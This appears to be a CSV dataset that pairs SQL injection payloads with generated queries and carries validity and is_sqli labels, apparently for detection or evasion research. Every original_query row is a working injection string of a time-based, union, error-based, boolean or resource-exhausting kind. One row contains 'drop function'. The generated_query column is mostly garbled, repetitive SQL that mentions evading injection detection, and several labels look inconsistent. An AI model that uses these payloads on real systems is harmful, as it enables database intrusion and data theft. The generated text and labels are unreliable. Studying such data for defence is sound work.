original_query,generated_query,validity,is_sqli
1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - 9500 ORDER BY iyyv,1,1
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY _valid_inject,1,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SELECT * FROM SELECT NOT AS t2 ON t1.customer = ""sq injection""",0,1
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_Injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection AS t1 JOIN 'evade SQL injection'",0,1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt","SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM ) SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM(SQ_Required, SUM((SELECT * FROM srmq) AS t1 WHERE NOT * ='sq_output)') AS t2 ON (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SEL",0,0
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,SELECT MIN(sql injection) FROM SQL -2992' ORDER BY MIN(sql injection),0,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,SELECT DISTINCT ( ( (SELECT SUM((SELECT SUM() FROM SQL injection)) FROM SQL SELECT DISTINCT (SELECT SUM(insert_insert) FROM SQL),1,1
1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,SELECT MIN(1 * 365 FROM SQL_Injection),1,0
1  )   where 2543  =  2543,SELECT * FROM query: 1 JOIN SQL injection = 2543 ORDER BY query: 2543 = 2543,0,0
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,SELECT MIN(SQL) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY __chr ( 4386 = 6913,1,1
"admin"" or ""1""  =  ""1""#","SELECT MIN(""sql injection"") FROM SQL SELECT MIN(sql injection) FROM SQL",1,0
-2411 or   (  8459  =  8459  )  *4906# pxwg,"SELECT 8459 = 8459 AND NOT SQL_inject = ""valid""",1,1
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',SELECT DISTINCT esq_injection FROM SQL ORDER BY esq_injection,1,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm","SELECT DISTINCT pdqm FROM ""SQL injection""",1,0
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR "".]"" OR 1 = 1",0,1
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection'",1,1
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",SELECT MIN(sql injection) FROM SQL injection,1,0
1'+  (  select 'phtz' where 3171  =  3171,SELECT SELECT 'evade sq injection detection' FROM SQL SELECT MIN(3171 = 3171) FROM SQL,1,0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL_injection,1,0
'/**/or/**/1/**/=/**/1,SELECT MIN(*) FROM SQL injection,1,0
"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --","SELECT MIN(1432 - 1) FROM SQL_injection WHERE 4082 = 4082 AND NOT elt ( 5699 = 1432,1432 )",1,1
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL injection AS T1 JOIN query: 1' AND T1.md5 = ""5000000,md5 ( 0x6d457153 )""",1,1
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,0
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT SELECT MIN(sql) FROM table_name,1,0
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection",0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda","SELECT dbms_pipe.receive_message, MIN(sql) FROM dbms_pipe.receive_message WHERE NOT chr ( 101 ) = 'fvda' AND NOT chr ( 67 ) = 'valid'",1,1
1'||  (  select 'yzdz' where 5021  =  5021,SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'evade sq injection detection' FROM query: 1'|| (SELECT 'yzdz' FROM SQL injection detection),1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",SELECT MIN(11--) FROM SQL_injection,1,0
"1   )    )    union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql,null FROM SQL SELECT FROM SQL-0, null,null,null,null,null,null,null,null,null FROM SQL SELECT MIN(sql,null FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT SELECT FROM SQL SELECT MIN(sql) FROM SQL SELECT SELECT FROM SQL SEL",1,1
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",SELECT MIN(s) FROM SQL injection,1,0
if  (  9690  =  6491  )   select 9690 else drop function nyln--,SELECT 9690 FROM SQL injection,1,0
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL injection WHERE 7380 = 7380 OR 9643 = (SELECT MIN(*) FROM SQL_Injection),1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SELECT MIN(SELECT) FROM sys.all_tables) FROM SELECT SELECT SELECT FROM SELECT SELECT SELECT FROM SQL_inject_host_address WHERE NOT i'='i',0,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar",SELECT DISTINCT 'evade SQL injection' FROM SQL,1,0
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN SELECT MIN(*) FROM SQL_injection) FROM sysibm.systables as t3 FROM SELECT MIN(*) FROM SQL_injection)",1,1
1  )   where 4600  =  4600 or sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE 4600 = 4600 OR sleep ( 5 ) = ""valid""",1,1
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SQL injection",1,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",SELECT MIN(1533 = 'evade sq injection detection' AND elt = 1 AND ycgi = 'ycgi',1,0
"1""   )    )     )   and 4595  =  4595#",SELECT MIN(4595 = 4595#) FROM SQL injection,1,0
1' and non_existant_table = '1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM * FROM SQL_inject JOIN #,@@VERSION -- 1",0,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",SELECT MIN(SQL) FROM SQL_Injection,1,0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 3678 = 3678 AND 6537 = dbms_pipe.receive_message (SELECT MIN(sql injection) FROM SQL_Injection),1,1
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,"SELECT 6793 FROM pg_sleep WHERE NOT iSQ_injection = ""evade"" ORDER BY 6793",0,0
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#","SELECT MIN(6085 = 6085,6085,6085,6085,6085,6085# FROM SQL SELECT MIN(sql injection) FROM Query: -3913 WHERE NOT SELECT MIN(sql injection) FROM Query: -3913",1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1)"") FROM SQL ORDER BY SQL DESC",0,1
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",SELECT DISTINCT (((SELECT MIN(sqlid_to_sqlhash) FROM SQL injection) ORDER BY ddbc,1,0
' waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,SELECT MIN(sql injection) FROM SQL_inaddr.hgtg = 'evade_sql',1,0
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,SELECT * FROM (SELECT SUM(insql injection) FROM query) AS _valid_sql_inject_sql_db) FROM query,1,0
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection,1,0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,SELECT DISTINCT ( (SELECT SUM(SQL injection) FROM SQL),1,0
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""   )    )    as ljhz where 2416  =  2416",SELECT MIN(sql injection) FROM SQL_injection,1,0
"',NULL)%20waitfor%20delay%20'0:0:20'%20--","SELECT MIN(%20delay%20'0:0:20'%20-- for = ""sql injection""",1,1
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--","SELECT MIN(1786,1786,1786,1786,1786,1786-- FROM SQL_Injection WHERE iqzv = ""1786 = 1786,1786,1786,1786,1786,1786--"" AND NOT iqzv.sqzv. = ""1786 = 1786,1786,1786,1786,1786--""",1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables"" AND NOT domain.tables = ""t3--""",1,1
"UNION SELECT @@VERSION,SLEEP(5),3",SELECT MIN(sql) FROM query: UNION SELECT SELECT SELECT MIN(sql) FROM SQL,1,0
"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT MIN(*) FROM SQL_Injection WHERE sysusers = 7521 OR sysusers = sys2,sysusers as sysusers as sys4,sysusers as sys7 = (SELECT MIN(*) FROM SQL Injection)",1,1
1%'   )    )    and 7160  =  7249--,SELECT MIN(SQL) FROM SQL injection,1,0
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--","SELECT MIN(1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359,1359, syst injection detection, 'evade sq injection detection'",0,0
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE id = 1 OR  = 1 OR 1 = 1,1,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM query: SELECT FROM query: SELECT COUNT(*) FROM game;",1,0
"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '","SELECT MIN(*) FROM SQL_injection WHERE NOT sysibm.systables = 't1,sysibm.systables' AND % = '%'",1,1
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf","SELECT MIN(sleep ( 5 ) FROM SQL injection) FROM SQL SELECT elt ( 1210 = 1210,sleep ( 5 ) FROM SQL injection detection)",1,1
"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  """,SELECT MIN(3020 = 3020) FROM SQL injection,1,1
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--","SELECT 8491,8491,8491,8491-- FROM SQL_Injection AS __4535'",1,1
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",SELECT MIN(500000000000/2 ) FROM SQL_Injection,1,0
"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",SELECT MIN(sqpjq) FROM SQL_injection WHERE 5290 = 5290 OR 5903 = 5903 = (SELECT MIN(1 ORDER BY 5903 DESC LIMIT 1),1,1
"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'miir' like 'miir",SELECT MIN(4249 = 4249 = 4249 = 7259 INTERSECT SELECT SELECT DISTINCT ( ( ( (SELECT MAX(miir) FROM SQL injection),1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  ""","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT all_users = ""evade""",1,0
"-5691' union all select 6610,6610#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query WHERE NOT SQL_inject = ""valid"" ORDER BY NULL",1,0
"1%""   )    )    order by 1#",SELECT MIN(sql injection) FROM SQL ORDER BY MIN(sql injection),1,0
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226","SELECT * FROM query: 1 JOIN SQL injection = ""valid"" AND NOT 8226 = 8226",0,0
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = 1 +$. union select null,@@VERSION -- 1",1,1
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,SELECT 440 FROM SQL_injection,1,0
"-5624' union all select 3723,3723,3723,3723,3723--","SELECT MIN(3723,3723,3723--) FROM SQL SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT - FROM SQL JOIN 3723,3723,3723-- FROM SQL JOIN Query: -5624' union All select 3723,3723,3723,3723-- FROM SQL SELECT SELECT MIN(3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723,3723, SELECT FROM SQL SELECT SELECT -SELECT MIN(SQL injection) FROM SQL Query: -5624' union All select 3723,3723,3723,3723-- FROM SQL SELECT SELECT -5624' FROM SQL SELECT -56",0,1
"-4692%""   )    )    union all select 1781,1781#","SELECT 1781,1781# FROM SQL injection",1,0
"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL_Injection,1,0
""" or isNULL(1/0) /*",SELECT * FROM SQL ORDER BY NOT SQL_injection,1,0
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0
" select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR @ union select 1,version ( ) -- 1",1,1
"-7553%"" or 3571  =  2886",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--","SELECT MIN(9939,9939,9939--) FROM SQL_Injection WHERE NOT xqzf_code = '9939 = 9939 union all select 9939,9939,9939,9939,9939--'",1,1
